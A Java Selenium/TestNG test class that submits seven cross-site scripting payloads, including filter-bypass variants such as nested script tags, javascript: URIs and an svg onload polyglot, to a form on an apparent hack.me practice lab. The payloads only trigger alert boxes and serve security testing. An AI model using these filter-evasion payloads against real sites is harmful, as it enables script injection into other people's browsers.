package xsstests;

import org.openqa.selenium.By;
import org.testng.annotations.DataProvider;
import org.testng.annotations.Test;

public class XSSTest extends BaseTest{

@Test(dataProvider = "AlertScirpt")
public void xssTest (String num, String script) {

    driver.get("http://s92621-101020-no2.sipontum.hack.me/xss1.php");
    driver.findElement(By.cssSelector("[type='text']")).sendKeys(script);
    driver.findElement(By.cssSelector("[type='submit']")).click();

    if(driver.findElement(By.cssSelector("[jscontent='errorCode']")).isDisplayed()){
        System.out.println(driver.findElement(By.cssSelector("[jscontent='errorCode']")).getText() +
                ": " + num + " success!");
    }
    else {
        System.out.println(num + " failed :( ");
    }

}

    @DataProvider(name = "AlertScirpt")
    public static Object[][] scripts() {

        return new Object[][]{{"xss1", "<scr<script>ipt>alert(\"xss\");</scr</script>ipt>"},
                {"xss2", "<table><td background=\"javascript:alert('xss')\">"},
                {"xss3", "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"},
                {"xss4", "<IMG SRC=\"javascript:alert('XSS');\">"},
                {"xss5", "<script /**/>/**/alert(1)/**/</script /**/"},
                {"xss6", "<script ^__^>alert(String.fromCharCode(49))</script ^__^>"},
                {"xss7", "<script ~~~>alert(0%0)</script ~~~>"},
        };
    }
}